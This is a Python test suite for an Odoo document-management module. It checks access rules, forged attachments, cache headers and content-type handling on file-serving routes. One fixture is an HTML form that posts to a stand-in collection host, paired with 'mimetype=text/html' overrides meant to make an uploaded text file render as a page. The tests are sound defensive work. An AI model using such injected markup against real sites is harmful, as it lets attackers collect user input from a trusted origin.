# Copyright 2026 WoowTech
# License LGPL-3.0 or later (https://www.gnu.org/licenses/lgpl-3.0).

"""Core binary route must enforce document rules before streaming."""

import base64
import io
import secrets
import zipfile

from PIL import Image

from odoo import Command
from odoo.tests import HttpCase, tagged


@tagged('woow_docmgmt_http')
class TestNativeDocumentRoutes(HttpCase):

    def test_web_content_respects_document_rules(self):
        folder = self.env['woow.document.folder'].sudo().create({'name': 'Native route folder'})
        document = self.env['woow.document'].sudo().create({
            'name': 'native.txt', 'folder_id': folder.id,
            'datas': base64.b64encode(b'native-route-content'),
        })
        member = self.env['res.users'].sudo().create({
            'name': 'Native route member', 'login': 'wdoc-native-route-member',
            'groups_id': [Command.set([
                self.env.ref('woow_document_management.group_woow_document_user').id])],
        })
        self.authenticate(member.login, member.login)
        path = '/web/content/woow.document/%d/datas/native.txt' % document.id
        denied = self.url_open(path, allow_redirects=False)
        self.assertEqual(denied.status_code, 404)
        self.env['woow.document.folder.access'].sudo().create({
            'folder_id': folder.id, 'subject_type': 'user',
            'user_id': member.id, 'level': 'read',
        })
        self.env.flush_all()
        allowed = self.url_open(path, allow_redirects=False)
        self.assertEqual(allowed.status_code, 200)
        self.assertEqual(allowed.content, b'native-route-content')

    def _reader_fixture(self, suffix, content=b'native-file-content', name='probe.txt'):
        group = self.env.ref('woow_document_management.group_woow_document_user')
        reader = self.env['res.users'].sudo().create({
            'name': 'Native reader %s' % suffix, 'login': 'wdoc-native-reader-%s' % suffix,
            'groups_id': [Command.set([group.id])]})
        folder = self.env['woow.document.folder'].sudo().create({
            'name': 'Native folder %s' % suffix, 'owner_id': self.env.ref('base.user_admin').id})
        self.env['woow.document.folder.access'].sudo().create({
            'folder_id': folder.id, 'subject_type': 'user', 'user_id': reader.id, 'level': 'read'})
        document = self.env['woow.document'].sudo().create({
            'name': name, 'folder_id': folder.id, 'datas': base64.b64encode(content)})
        self.env.flush_all()
        return reader, folder, document

    def test_a_second_file_attachment_is_never_served_on_any_route(self):
        """Every route streams the attachment the document records, never a newer claimant."""
        reader, folder, document = self._reader_fixture('dup')
        self.authenticate(reader.login, reader.login)
        routes = ('/woow_document/doc/%d/download' % document.id,
                  '/woow_document/doc/%d/preview' % document.id,
                  '/web/content/woow.document/%d/datas/probe.txt' % document.id,
                  '/woow_document/zip?document_ids=%d' % document.id)

        def served(path):
            response = self.url_open(path, allow_redirects=False)
            if response.status_code != 200 or 'zip' not in path:
                return response.status_code, response.content
            with zipfile.ZipFile(io.BytesIO(response.content)) as archive:
                return 200, b''.join(archive.read(name) for name in archive.namelist())

        for path in routes:
            self.assertEqual(served(path), (200, b'native-file-content'), path)
        forged = self.env['ir.attachment'].sudo().create({
            'name': 'datas', 'type': 'binary', 'raw': b'FORGED-BYTES',
            'res_model': 'woow.document', 'res_id': document.id, 'res_field': 'datas'})
        self.env.flush_all()
        for path in routes:
            self.assertEqual(served(path), (200, b'native-file-content'), path)
        forged.unlink()
        self.env.flush_all()
        self.assertEqual(served(routes[0]), (200, b'native-file-content'))

    def test_access_token_never_makes_a_document_response_public(self):
        png = io.BytesIO()
        Image.new('RGB', (2, 2), 'blue').save(png, format='PNG')
        portal_password = secrets.token_urlsafe(16)
        reader, folder, document = self._reader_fixture('token', png.getvalue(), 'probe.png')
        partner = self.env['res.partner'].sudo().create({'name': 'Native portal reader'})
        portal = self.env['res.users'].sudo().create({
            'name': 'Native portal reader', 'login': 'wdoc-native-portal-token',
            'password': portal_password, 'partner_id': partner.id,
            'groups_id': [Command.set([self.env.ref('base.group_portal').id])]})
        self.env['woow.document.folder.access'].sudo().create({
            'folder_id': folder.id, 'subject_type': 'partner', 'partner_id': partner.id,
            'level': 'read'})
        self.env.flush_all()
        content = '/web/content/woow.document/%d/datas/probe.png?unique=1' % document.id
        image = '/web/image/woow.document/%d/datas/probe.png?unique=1' % document.id
        for login, password in ((reader.login, reader.login), (portal.login, portal_password)):
            with self.subTest(login=login):
                self.authenticate(login, password)
                plain = self.url_open(content, allow_redirects=False)
                self.assertEqual(plain.status_code, 200)
                self.assertIn('private', plain.headers.get('Cache-Control', ''))
                for path in (content, image):
                    response = self.url_open(path + '&access_token=x', allow_redirects=False)
                    cache = response.headers.get('Cache-Control', '')
                    self.assertNotIn('public', cache, path)
                    self.assertNotEqual(response.content, png.getvalue(), path)
                self.assertEqual(self.url_open(content + '&access_token=x',
                                               allow_redirects=False).status_code, 404)

    def _docx(self):
        stream = io.BytesIO()
        with zipfile.ZipFile(stream, 'w') as archive:
            archive.writestr('[Content_Types].xml', '<Types/>')
            archive.writestr('word/document.xml', '<document/>')
        return stream.getvalue()

    def test_native_routes_keep_the_stored_type_whatever_the_request_says(self):
        """A ``mimetype`` query must not turn an uploaded file into an HTML page.

        Core passes the parameter to the stream and sends it inline with a policy that has
        no ``sandbox``; a text file that holds markup could then post a form or redirect
        from the site's own origin. The type is the one the upload policy serves, the
        policy always has ``sandbox``, and only whitelisted types are shown inline.
        """
        markup = b'<form action="https://example.test/collect" method="post"><input name="x"></form>'
        png = io.BytesIO()
        Image.new('RGB', (2, 2), 'blue').save(png, format='PNG')
        password = secrets.token_urlsafe(16)
        reader, folder, text = self._reader_fixture('type', markup, 'markup.txt')
        documents = self.env['woow.document'].sudo()
        image = documents.create({'name': 'probe.png', 'folder_id': folder.id,
                                  'datas': base64.b64encode(png.getvalue())})
        office = documents.create({'name': 'probe.docx', 'folder_id': folder.id,
                                   'datas': base64.b64encode(self._docx())})
        partner = self.env['res.partner'].sudo().create({'name': 'Native type portal reader'})
        portal = self.env['res.users'].sudo().create({
            'name': 'Native type portal reader', 'login': 'wdoc-native-type-portal',
            'password': password, 'partner_id': partner.id,
            'groups_id': [Command.set([self.env.ref('base.group_portal').id])]})
        self.env['woow.document.folder.access'].sudo().create({
            'folder_id': folder.id, 'subject_type': 'partner', 'partner_id': partner.id,
            'level': 'read'})
        self.env.flush_all()
        overrides = ('mimetype=text/html', 'mimetype=image/svg%2Bxml', 'mimetype=application/pdf')
        for login, secret in ((reader.login, reader.login), (portal.login, password)):
            self.authenticate(login, secret)
            for document, served, inline in ((text, 'text/plain', True),
                                             (image, 'image/png', True),
                                             (office, 'application/vnd.openxmlformats-'
                                              'officedocument.wordprocessingml.document', False)):
                for route in ('/web/content/woow.document/%d/datas', '/web/image/woow.document/%d/datas'):
                    for override in overrides + ('download=0',):
                        path = '%s?%s' % (route % document.id, override)
                        with self.subTest(user=login, path=path):
                            response = self.url_open(path, allow_redirects=False)
                            self.assertEqual(response.status_code, 200)
                            kind = response.headers['Content-Type']
                            if '/web/image/' in path and document is text:
                                self.assertTrue(kind.startswith('text/plain') or kind.startswith(
                                    'application/octet-stream'), kind)
                            else:
                                self.assertEqual(kind.split(';')[0], served, kind)
                            self.assertEqual(kind.count('charset'), kind.startswith('text/') and 1 or 0)
                            policy = response.headers['Content-Security-Policy']
                            self.assertIn('sandbox', policy)
                            self.assertIn("default-src 'none'", policy)
                            disposition = response.headers.get('Content-Disposition', '')
                            self.assertEqual(disposition.startswith('attachment'), not inline)
                            self.assertEqual(response.headers['X-Content-Type-Options'], 'nosniff')
            forced = self.url_open(
                '/web/content/woow.document/%d/datas?download=1&mimetype=text/html' % text.id,
                allow_redirects=False)
            self.assertTrue(forced.headers['Content-Disposition'].startswith('attachment'))
            self.assertTrue(forced.headers['Content-Type'].startswith('text/plain'))
            self.assertEqual(forced.content, markup)

    def test_the_attachment_row_of_a_document_has_no_route_of_its_own(self):
        """``/web/content/<attachment id>`` would let the query choose the type again."""
        reader, _folder, document = self._reader_fixture('row', b'plain bytes', 'row.txt')
        attachment = self.env['ir.attachment'].sudo().search([
            ('res_model', '=', 'woow.document'), ('res_id', '=', document.id),
            ('res_field', '=', 'datas')])
        self.assertEqual(len(attachment), 1)
        self.authenticate(reader.login, reader.login)
        for path in ('/web/content/%d', '/web/content/%d?mimetype=text/html',
                     '/web/content/%d?download=1', '/web/image/%d?mimetype=image/svg%%2Bxml',
                     '/web/content?model=ir.attachment&id=%d&field=raw&mimetype=text/html'):
            with self.subTest(path=path):
                response = self.url_open(path % attachment.id, allow_redirects=False)
                if path.startswith('/web/image'):
                    # The image route answers a refused file with its placeholder picture.
                    self.assertEqual(response.headers['Content-Type'], 'image/png')
                    self.assertEqual(response.status_code, 200)
                else:
                    self.assertEqual(response.status_code, 404)
                self.assertNotIn(b'plain bytes', response.content)
        route = self.url_open('/web/content/woow.document/%d/datas' % document.id,
                              allow_redirects=False)
        self.assertEqual((route.status_code, route.content), (200, b'plain bytes'))
